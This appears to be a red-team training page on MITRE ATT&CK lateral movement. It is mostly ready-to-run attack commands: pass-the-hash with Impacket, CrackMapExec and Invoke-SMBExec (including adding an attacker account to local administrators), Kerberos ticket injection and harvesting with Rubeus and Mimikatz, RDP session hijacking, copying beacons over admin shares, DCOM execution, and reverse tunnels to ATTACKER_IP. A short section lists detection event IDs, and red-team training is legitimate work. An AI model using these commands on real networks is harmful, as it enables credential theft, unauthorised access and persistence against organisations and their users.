---
layout: training-page
title: "TA0008 — Lateral Movement — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - lateral-movement
  - pass-the-hash
  - pivoting
  - smb
  - rdp
page_key: "mitre-ta0008"
render_with_liquid: false
---

# TA0008 — Lateral Movement

Lateral Movement techniques allow adversaries to move from an initial foothold to other systems in the network, expanding their reach toward high-value targets like domain controllers, data repositories, or critical servers. Effective lateral movement uses stolen credentials rather than fresh exploitation — making it difficult to distinguish from legitimate admin activity.

The two most common lateral movement patterns in Windows environments are Pass-the-Hash over SMB and Pass-the-Ticket using Kerberos tickets. Both let attackers authenticate as legitimate users without knowing their cleartext passwords.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1021 | Remote Services | T1021.001 Remote Desktop Protocol | xfreerdp, mstsc — visual access via GUI |
| T1021 | Remote Services | T1021.002 SMB/Windows Admin Shares | psexec.py, smbexec.py — shell via SMB |
| T1021 | Remote Services | T1021.003 DCOM | dcomexec.py — Excel/ShellBrowserWindow COM |
| T1021 | Remote Services | T1021.004 SSH | Stolen SSH keys to pivot between Linux hosts |
| T1021 | Remote Services | T1021.005 VNC | RealVNC/TigerVNC with captured creds |
| T1021 | Remote Services | T1021.006 Windows Remote Management | winrm / evil-winrm — PowerShell remoting |
| T1550 | Use Alternate Authentication Material | T1550.002 Pass the Hash | NTLM hash → authenticate without cleartext |
| T1550 | Use Alternate Authentication Material | T1550.003 Pass the Ticket | Rubeus PT ticket → inject into memory |
| T1550 | Use Alternate Authentication Material | T1550.004 Web Session Cookie | Stolen cookie → access web app as victim |
| T1534 | Internal Spearphishing | — | Phish another employee from compromised mailbox |
| T1570 | Lateral Tool Transfer | — | Copy beacon/toolkit to target via SMB/WinRM |
| T1080 | Taint Shared Content | — | Drop payload in shared folder → waits for access |
| T1563 | Remote Service Session Hijacking | T1563.002 RDP Hijacking | Attach to existing RDP session via tscon |
| T1210 | Exploitation of Remote Services | — | EternalBlue, BlueKeep — remote exploit via network |
| T1072 | Software Deployment Tools | — | Abuse SCCM/Intune to push payload |
| T1091 | Replication Through Removable Media | — | Plant on shared drive, waits for USB access |

## Red Team Tooling

### Pass-the-Hash (SMB)

```
# Impacket psexec — PtH, drops service binary on target (noisy, leaves artifacts)
python3 psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# Impacket smbexec — PtH, no binary drop (quieter than psexec)
python3 smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# Impacket wmiexec — PtH via WMI (no service creation, quieter)
python3 wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# CrackMapExec — test and execute across many hosts
cme smb 10.10.10.0/24 -u Administrator -H NTLM_HASH --exec-method smbexec
cme winrm TARGET_IP -u user -H NTLM_HASH -x "whoami"

# Invoke-TheHash (PowerShell, in-memory PtH without Mimikatz)
Invoke-SMBExec -Target TARGET_IP -Domain DOMAIN -Username user \
  -Hash NTLM_HASH -Command "net localgroup administrators attacker /add" -Verbose
```

### Pass-the-Ticket (Kerberos)

```
# Rubeus — inject ticket into current logon session
Rubeus.exe ptt /ticket:BASE64_KIRBI_TICKET

# Rubeus — request TGS and inject in one step
Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/DC01.corp.local /ptt

# Rubeus — harvest all tickets from memory (requires admin)
Rubeus.exe harvest /interval:30

# Use injected ticket with net commands
net use \\DC01\C$ /user:DOMAIN\Administrator
dir \\DC01\C$

# Mimikatz — inject .kirbi ticket
kerberos::ptt ticket.kirbi
# Then use klist to confirm injection and access resources
```

### RDP Lateral Movement

```
# xfreerdp with PtH (requires restricted admin mode enabled)
xfreerdp /u:Administrator /pth:NTLM_HASH /v:TARGET_IP +clipboard /cert:ignore

# xfreerdp with cleartext creds
xfreerdp /u:user /p:'Password123!' /d:DOMAIN /v:TARGET_IP +clipboard /cert:ignore /dynamic-resolution

# RDP session hijacking (requires SYSTEM, no creds needed)
# List active sessions:
query session /server:TARGET
# Attach to disconnected session without creds:
tscon 2 /dest:rdp-tcp#5
```

### WinRM / Evil-WinRM

```
# Evil-WinRM — feature-rich WinRM shell with PtH support
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
evil-winrm -i TARGET_IP -u user -p 'Password123!'

# Built-in PowerShell remoting (requires credentials configured)
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami; hostname} -Credential $cred
```

### SMB File/Tool Transfers

```
# Copy beacon to remote host via SMB (admin share access)
net use \\TARGET\C$ /user:DOMAIN\user 'Password123!'
copy C:\Windows\Temp\beacon.exe \\TARGET\C$\Windows\Temp\beacon.exe
net use \\TARGET\C$ /delete

# Impacket smbclient — interactive SMB session
python3 smbclient.py DOMAIN/user:password@TARGET_IP
# put beacon.exe C:\Windows\Temp\beacon.exe

# PowerShell copy via WinRM
$sess = New-PSSession -ComputerName TARGET -Credential $cred
Copy-Item -Path C:\beacon.exe -ToSession $sess -Destination C:\Windows\Temp\
```

### DCOM Lateral Movement

```
# Impacket dcomexec — DCOM-based execution (stealthier than psexec)
python3 dcomexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP 'whoami'

# PowerShell DCOM via MMC Application
$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\out.txt", "7")
```

### Tunneling for Lateral Movement

```
# Chisel SOCKS5 proxy — access internal network through compromised host
# On attacker (server):
./chisel server --reverse --port 8080

# On compromised host (client):
chisel.exe client ATTACKER_IP:8080 R:socks

# Route traffic through SOCKS (proxychains)
proxychains python3 psexec.py DOMAIN/user:password@INTERNAL_HOST

# Ligolo-ng — tun interface for transparent pivoting
# Attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Target:
./agent -connect ATTACKER_IP:11601 -ignore-cert
# In ligolo console: session → start → add route
sudo ip route add 10.10.10.0/24 dev ligolo
```

## Detection Notes

- **Pass-the-Hash**: Event ID 4624 (Logon Type 3 — network logon) with NTLM authentication from unusual source; `Restricted Admin Mode` required for RDP PtH — its enablement (Event 4624 Logon Type 10) is suspicious
- **Lateral tool transfer**: Sysmon Event 11 (file created) in unusual paths on remote hosts; SMB writes to admin shares (C$, ADMIN$) from non-admin systems
- **WinRM**: Event ID 91 (WSMan) in Microsoft-Windows-WinRM/Operational; PowerShell remoting logs in Microsoft-Windows-PowerShell/Operational
- **RDP hijacking**: unusual `tscon.exe` execution from non-interactive session; Event ID 4778 (session reconnected) with different source than expected
- **DCOM**: Event ID 4624 + COM object instantiation from non-standard user contexts; Sysmon Event 1 showing unusual DCOM process parent chains

## Related Academy Pages

- [Pass-the-Hash / PTT](/active-directory/pass-the-hash/)
- [WMI Lateral Movement](/post-exploitation/wmi-lateral/)
- [DCOM Lateral Movement](/post-exploitation/dcom-lateral/)
- [WinRM Lateral Movement](/post-exploitation/winrm-lateral/)
- [RDP Session Hijacking](/post-exploitation/rdp-hijacking/)
- [Chisel & SOCKS5](/pivoting/chisel-socks/)
- [Ligolo-ng](/pivoting/ligolo-ng/)
- [NTLM Relay Attacks](/active-directory/ntlm-relay/)

## Resources

- [TA0008 — MITRE ATT&CK Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [T1021 — Remote Services](https://attack.mitre.org/techniques/T1021/)
- [T1550 — Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [Impacket GitHub](https://github.com/fortra/impacket)
